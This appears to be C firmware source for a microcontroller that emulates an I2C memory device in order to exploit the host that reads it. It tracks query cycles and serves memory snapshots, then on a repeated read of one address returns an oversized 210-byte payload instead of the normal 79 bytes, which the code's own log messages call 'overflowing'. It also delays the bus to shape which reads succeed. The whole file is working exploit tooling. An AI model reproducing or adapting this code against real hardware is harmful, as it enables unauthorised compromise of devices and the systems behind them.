#include "main.h"
#include "staticMem.h"
#include "payload_taint_clear_refs.h"

static unsigned int queryCycle = 0;
static volatile uint8_t trigger_iteration = 0;
static unsigned int intr_read_iteration = 0;
static const uint8_t allowed_read[] = {0, 1, 0, 1, 0, 1, 0, 1, 0, 1};
static uint8_t state = 0;
static unsigned int loopDelay = 0;
static uint32_t startTick = 0;

void exploitMemWrite(int addr, const uint8_t c);
static int exploitMemRead(int addr, const uint8_t** bufloc);
static void exploitYield(void);

void exploitLoopActions(void)
{
	if(loopDelay > 0)
	{
		HAL_GPIO_TogglePin(DEBUG_PIN);
		__HAL_I2C_DISABLE(&I2cHandle1);
		HAL_Delay(loopDelay);
		loopDelay = 0;
		__HAL_I2C_ENABLE(&I2cHandle1);
		HAL_GPIO_TogglePin(DEBUG_PIN);
		printf("trigger_iteration = %d allowed_read[trigger_iteration] = %d\r\n", trigger_iteration-1, allowed_read[trigger_iteration-1]);
	}
}

// Finds new query iterations
void discoverQueries(unsigned short addr)
{
	if(addr == 0xE9)
	{
		queryCycle++;
		printf("query started queryCycle = %d\r\n", queryCycle);
	}
	//TODO find out how to figure query ends
}


static void checkAllowDisallow(int addr, uint8_t c)
{
	if(((addr == 0x4E) || (addr == 0xBC)) && (c == 0x00))
	{
		if(!allowed_read[trigger_iteration])
		{
			loopDelay = 49;
		}
		else
		{
			//TODO maybe debug something
		}
		trigger_iteration++;;
	}
}

static void updateStateMachine(int addr)
{
	if(addr == stateMachine[state])
	{
		state++;
		printf("State change new state = %d\r\n", state);
	}
}


void init_exploit()
{
	printf("Init exploit\r\n");
	queryCycle = 0;
	trigger_iteration = 0;
	intr_read_iteration = 0;
	state = 0;
	startTick = 0;
	
	initI2cMemAux(ASK_DATA);
	setOnWrite(&exploitMemWrite);
	setOnRead(&exploitMemRead);
	setYield(&exploitYield);
	HAL_GPIO_WritePin(INTERRUPT_OUT, GPIO_PIN_SET);
	
	for(unsigned int i=0; i<10; i++)
	{
		for(unsigned int j=0; j<16; j++)
		{
			printf("%02x\t", payload[i*16 + j]);
		}
		printf("\r\n");
	}
}

void destroy_exploit()
{
	setI2cMode(PASS_THROUGH);
}


static void exploitYield(void)
{
	if((startTick != 0) &&
			(startTick != (uint32_t) -1) &&
			((startTick + 30000) < HAL_GetTick()))
	{
		interruptStart();
		startTick = (uint32_t) -1;
	}
}

void exploitMemWrite(int addr, const uint8_t c)
{
	checkAllowDisallow(addr, c);
}

static int exploitMemRead(int addr, const uint8_t** bufloc)
{
	if(startTick == 0)
	{
		startTick = HAL_GetTick();
	}
	interruptStop();
	discoverQueries(addr);
	updateStateMachine(addr);

	if(addr > 0x500)
	{
		*bufloc = mem_after_500 + addr;
		return 79;
	}
	else if(addr != 0x06)
	{
		*bufloc = memory_snapshots[state] + addr;
		return 79;
	}
	else
	{
		intr_read_iteration++;
		printf("intr_read_iteration = %d", intr_read_iteration);
		if(intr_read_iteration < 3)
		{
			printf(" not overflowing queryCycle = %d\r\n", queryCycle);
			*bufloc = memory_snapshots[state] + addr;
			return 79;
		}
		else
		{
			printf(" overflowing queryCycle = %d\r\n", queryCycle);
			*bufloc = payload;
			return 210;
		}
	}
}

